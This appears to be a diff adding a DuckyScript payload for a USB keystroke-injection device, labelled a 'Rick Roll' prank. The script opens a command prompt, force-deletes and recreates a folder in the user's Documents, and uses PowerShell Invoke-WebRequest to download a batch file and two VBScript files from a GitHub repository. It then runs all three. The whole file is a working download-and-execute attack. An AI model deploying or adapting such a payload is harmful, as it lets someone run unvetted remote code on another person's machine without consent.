@@ -1,0 +1,34 @@
+REM Author: [LONG]
+REM Version: [1.0]
+REM Decription: Rick Roll.
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+REM Del Dir if already exists.
+STRING cd / && cd %USERPROFILE%\documents && If EXIST %USERPROFILE%\documents\Rick RMDIR %USERPROFILE%\documents\Rick /S /Q
+DELAY 250
+ENTER
+REM Makes new Dir 
+STRING mkdir Rick && cd Rick
+ENTER
+DELAY 250
+STRING Powershell
+DELAY 1000
+ENTER
+REM Gets files from git repo.
+STRING Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/RICK.bat' -OutFile ./Rick.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/Rick.vbs' -OutFile ./RickSound.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/vol.vbs' -OutFile ./RickVOL.vbs
+DELAY 250
+ENTER
+REM Wait for download
+DELAY 5000
+STRING cmd
+DELAY 250
+ENTER
+DELAY 500
+REM Starts Batch files and vb-scripts.
+STRING start RickVOL & start RickSound.vbs & start Rick.bat
+DELAY 250 
+ENTER
